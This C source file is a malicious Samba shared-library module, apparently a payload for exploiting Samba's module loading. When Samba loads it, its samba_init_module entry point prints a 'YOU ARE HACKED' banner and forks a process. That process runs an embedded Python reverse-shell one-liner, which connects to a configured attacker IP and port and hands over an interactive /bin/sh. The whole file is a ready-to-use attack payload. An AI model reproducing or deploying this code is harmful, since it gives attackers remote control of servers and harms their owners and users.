#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include "config.h"
#define COMMAND "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""IP"\","PORT"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"

static void CreateReverseShell()
{
    pid_t pid;
    pid = fork(); // Use subprocess to detach the main samba process
    if (pid == 0)
    {
        umask(0);
        chdir("/");
        execl("/usr/bin/python", "python", "-c", (COMMAND), NULL); // Use python to create TCP connection and setup reverse shell
    }
}

// When Samba load modules, it automatically call this function as entry point
int samba_init_module(void)
{
    // Character: YOU ARE HACKED
    printf("__  __               ___                 __  __           __            __\n\\ \\/ /___  __  __   /   |  ________     / / / /___ ______/ /_____  ____/ /\n \\  / __ \\/ / / /  / /| | / ___/ _ \\   / /_/ / __ `/ ___/ //_/ _ \\/ __  / \n / / /_/ / /_/ /  / ___ |/ /  /  __/  / __  / /_/ / /__/ ,< /  __/ /_/ /  \n/_/\\____/\\__,_/  /_/  |_/_/   \\___/  /_/ /_/\\__,_/\\___/_/|_|\\___/\\__,_/   \n");
    CreateReverseShell();
    
    return 0;
}
